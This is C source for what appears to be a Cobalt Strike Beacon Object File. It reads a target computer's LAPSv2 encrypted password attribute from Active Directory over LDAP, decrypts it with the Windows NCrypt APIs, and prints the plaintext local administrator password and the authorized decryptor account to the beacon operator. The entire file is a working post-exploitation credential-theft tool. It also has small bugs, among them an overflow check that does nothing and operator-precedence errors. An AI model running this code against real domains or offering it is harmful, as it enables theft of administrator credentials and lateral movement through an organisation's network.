#include <stdio.h>
#include <wchar.h>
#include <Windows.h>
#include <ncrypt.h>
#include <ncryptprotect.h>
#include <sddl.h>
#include <Winldap.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {

#include "beacon.h"

    struct blob_header {
        unsigned int upperdate;
        unsigned int lowerdate;
        unsigned int encryptedBufferSize;
        unsigned int flags;
    };

    bool searchLdap(PSTR ldapServer, ULONG port, PCHAR distinguishedName, PCHAR searchFilter, char **output, int* length) {

        DFR_LOCAL(wldap32, ldap_initA);
        DFR_LOCAL(wldap32, ldap_bind_sA);
        DFR_LOCAL(wldap32, ldap_search_s);
        DFR_LOCAL(wldap32, ldap_count_entries);
        DFR_LOCAL(wldap32, ldap_first_entry);
        DFR_LOCAL(wldap32, ldap_get_values_lenA);
        DFR_LOCAL(wldap32, ldap_get_values);
        DFR_LOCAL(wldap32, ldap_msgfree);

        LDAP *ldapHandle;
        PLDAPMessage searchResult = NULL;
        PCHAR attr[] = { "msLAPS-EncryptedPassword", NULL };
        ULONG entryCount;
        PLDAPMessage firstEntry = NULL;
        berval** outval;

        ldapHandle = ldap_initA(ldapServer, port);
        if (ldapHandle == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Error Initialising LDAP connection: ldap_initA");
            return false;
        }

        if (ldap_bind_sA(ldapHandle, distinguishedName, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Error Initialising LDAP connection: ldap_bind_sA");
            return false;
        }
            
        if (ldap_search_s(ldapHandle, distinguishedName, LDAP_SCOPE_SUBTREE, searchFilter, attr, 0, &searchResult) != LDAP_SUCCESS) {
            
            if (searchResult != NULL)
                ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "Error Using LDAP connection: ldap_search_s");
            return false;
        }

        entryCount = ldap_count_entries(ldapHandle, searchResult);
        if (entryCount == 0) {

            if (searchResult != NULL)
                ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "0 results found from LDAP");
            return false;
        }

        firstEntry = ldap_first_entry(ldapHandle, searchResult);
        if (firstEntry == NULL) {

            if (searchResult != NULL)
                ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "Error ldap_first_entry");
            return false;
        }

        outval = ldap_get_values_lenA(ldapHandle, firstEntry, attr[0]);
        if (outval == NULL) {

            if (searchResult != NULL)
                ldap_msgfree(searchResult);

            if (firstEntry != NULL)
                ldap_msgfree(firstEntry);

            BeaconPrintf(CALLBACK_ERROR, "Error ldap_get_values_lenA");
            return false;
        }

        *output = (char*)outval[0]->bv_val;
        *length = outval[0]->bv_len;

        return true;
    }

    const char* GetMonthAbbrev(int month) {
        static const char* mon[] = {
            "Jan", "Feb", "Mar", "Apr", "May", "Jun",
            "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
        };

        if (month < 1 || month > 12) return "!?ERR?!";
        return mon[month - 1];
    }

    char* ConvertWinFileTimeToHumanTime(unsigned int dwLowDateTime, unsigned int dwHighDateTime) {

        static char buf[64];
        FILETIME ft;
        SYSTEMTIME st;
        DFR_LOCAL(KERNEL32, FileTimeToSystemTime);
        DFR_LOCAL(MSVCRT, sprintf);

        ft.dwLowDateTime = dwLowDateTime;
        ft.dwHighDateTime =  dwHighDateTime;

        //Unsure if this accounts for DSTs or LeapSecs
        if (FileTimeToSystemTime(&ft, &st)) {
            sprintf(buf, "%s/%02d/%04d %02d:%02d:%02d UTC", GetMonthAbbrev(st.wMonth), st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
            return buf;
        }
        else {
            sprintf(buf, "HUMANTIME_CONVERSION_FAIL");
            return buf;
        }

    }

    WCHAR* RemoveSIDPrefix(WCHAR* ss) {
        
        DFR_LOCAL(MSVCRT, wcslen);
        DFR_LOCAL(KERNEL32, LocalFree);

        static WCHAR buf[256];
        DWORD ssLen = wcslen(ss);
        DWORD copyLen = ssLen - 4;

        if (ssLen <= 4) {
            // Should never hit but if so some shit gon wrong.
            buf[0] = L'\0';
            BeaconPrintf(CALLBACK_ERROR, "RemoveSIDPrefix minimum prefix len not met. Len = %d. Returning empty buffer. \n", ssLen);
            return buf;
        }

        if (copyLen >= 256) {
            // Larger than normal bounds. Inform user and proceed to minimize bound it.
            BeaconPrintf(CALLBACK_ERROR, "RemoveSIDPrefix maximum buf exceeded. Results may will truncate/error.\n");
            copyLen = 255;
            return buf;
        }

        for (DWORD i = 0; i < copyLen; i++) {
            buf[i] = ss[i + 4];
        }

        // Null-termination
        buf[copyLen] = L'\0';  
        return buf;

    }

    WCHAR* ConvertSIDToNTAccount(WCHAR* ss) {

        PSID pSid = NULL;
        WCHAR sidString[256];
        WCHAR name[256];
        WCHAR domain[256];
        static WCHAR ntacct[256];
        SID_NAME_USE sidType;
        DWORD nameSize = sizeof(name);
        DWORD domainSize = sizeof(domain);

        DFR_LOCAL(KERNEL32, LocalFree);
        DFR_LOCAL(MSVCRT, _swprintf);
        DFR_LOCAL(KERNEL32, GetLastError);
        DFR_LOCAL(ADVAPI32, ConvertStringSidToSidW);
        DFR_LOCAL(ADVAPI32, LookupAccountSidW);

        // We are presuming the SID is a single SID. This may fail on multiple accounts allowed to decrypt returned as a list?


        // Convert SID string to SID structure
        if (!ConvertStringSidToSidW(ss, &pSid)) {
            BeaconPrintf(CALLBACK_ERROR, "ConvertStringSidToSidW failed. Error %lu\n", GetLastError());
            //return ;
        }

        // Look up the NT account name
        if (!LookupAccountSidW(NULL, pSid, name, &nameSize, domain, &domainSize, &sidType)) {
            BeaconPrintf(CALLBACK_ERROR, "LookupAccountSidW failed. Error %lu\n", GetLastError());
            LocalFree(pSid);
            //return ;
        }

        _swprintf(ntacct, L" %ls\\%ls\n", domain, name);
        // Clean up
        LocalFree(pSid);

        return ntacct;

    }

    SECURITY_STATUS WINAPI decryptCallback(
        void* pvCallbackCtxt,
        const BYTE* pbData,
        SIZE_T cbData,
        BOOL isFinal
        ) {

        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Output: %ls", pbData);

        return 0;
    }

    bool unprotectSecret(BYTE* protectedData, ULONG protectedDataLength) {

        BYTE* secData = NULL;
        ULONG secDataLength = 0;
        SECURITY_STATUS error;

        DFR_LOCAL(NCRYPT, NCryptStreamOpenToUnprotect);
        DFR_LOCAL(NCRYPT, NCryptUnprotectSecret);
        DFR_LOCAL(NCRYPT, NCryptStreamUpdate);
        DFR_LOCAL(NCRYPT, NCryptStreamClose);
        DFR_LOCAL(NCRYPT, NCryptGetProtectionDescriptorInfo);
        DFR_LOCAL(KERNEL32, LocalFree);

        NCRYPT_PROTECT_STREAM_INFO streamInfo;
        NCRYPT_STREAM_HANDLE streamHandle;
        NCRYPT_DESCRIPTOR_HANDLE unprotectHandle;

        streamInfo.pfnStreamOutput = decryptCallback;
        streamInfo.pvCallbackCtxt = NULL;

        BeaconPrintf(CALLBACK_OUTPUT, "Decrypting secret...\n");

        NCRYPT_STREAM_HANDLE streamHandle2;
        void* actualSidString = nullptr;
        void** sidString = &actualSidString;
        WCHAR* sSidString = NULL;
        BYTE* sidData = NULL;
        ULONG sidLen = 0;

        if (error = NCryptUnprotectSecret(&unprotectHandle, 0x41, protectedData + 16, protectedDataLength - 16, NULL, NULL, &sidData, &sidLen) != 0) {
            BeaconPrintf(CALLBACK_ERROR, "NCryptUnprotectSecret failed with error: %x\n", error);
            LocalFree(sidData);
        }

        if (error = NCryptGetProtectionDescriptorInfo(unprotectHandle, NULL, 1, sidString) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Authorized SID Decryptor(s): %ls\n", (WCHAR*)(*sidString));
            sSidString = RemoveSIDPrefix((WCHAR*) *sidString);
            BeaconPrintf(CALLBACK_OUTPUT, "\t SID NT Account Name: %ls\n", ConvertSIDToNTAccount(sSidString));
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "NCryptGetProtectionDescriptorInfo failed with error: %x\n", error);
            LocalFree(sidString);
        }

        if ((error = NCryptStreamOpenToUnprotect(&streamInfo, NCRYPT_SILENT_FLAG, 0, &streamHandle)) != 0) {
            BeaconPrintf(CALLBACK_ERROR, "NCryptStreamOpenToUnprotect error: %x\n", error);
            return false;
        }

        if ((error = NCryptStreamUpdate(streamHandle, protectedData + 16, protectedDataLength - 16, true)) != 0) {

            NCryptStreamClose(streamHandle);

            BeaconPrintf(CALLBACK_ERROR, "NCryptStreamUpdate error: %x\n", error);
            return false;
        }

        NCryptStreamClose(streamHandle);

        return true;
    }

    void go(char* args, int len) {
        unsigned char* output;
        int length;
        struct blob_header* header;
        datap  parser;

        DFR_LOCAL(MSVCRT, sprintf);
        
        char* domainController;
        char* distinguishedName;
        char* rootDN;
        char ldapSearch[1024];
        int stringSize = 0;

        BeaconDataParse(&parser, args, len);

        domainController = BeaconDataExtract(&parser, NULL);
        rootDN = BeaconDataExtract(&parser, NULL);
        distinguishedName = BeaconDataExtract(&parser, &stringSize);

        if (stringSize > sizeof(ldapSearch) - 45) {
            // Don't want an accidental overflow crashing the BOF
            ldapSearch[1024 - 45] = '\0';
        }

        sprintf(ldapSearch, "(&(objectClass=computer)(distinguishedName=%s))", distinguishedName);
        if (!searchLdap(domainController, 389, rootDN, ldapSearch, (char**)&output, &length)) {
            return;
        }

        header = (struct blob_header*)output;
        BeaconPrintf(CALLBACK_OUTPUT, "LAPSv2 Blob Header Info:\nUpper Date Timestamp: %d\nLower Date Timestamp: %d\nPassword Last Set Date: %s\nEncrypted Buffer Size: %d\nFlags: %d\n", header->upperdate, header->lowerdate, ConvertWinFileTimeToHumanTime(header->lowerdate, header->upperdate), header->encryptedBufferSize, header->flags);

        if (header->encryptedBufferSize != length - sizeof(struct blob_header)) {
            BeaconPrintf(CALLBACK_ERROR, "Header Length (%d) and LDAP Returned Length (%d) Don't Match.. decryption may fail", header->encryptedBufferSize, length-sizeof(blob_header));
        }

        if (!unprotectSecret((BYTE*)output, length)) {
            BeaconPrintf(CALLBACK_ERROR, "Could not unprotect LAPS creds");
            return;
        }
    }
}
#
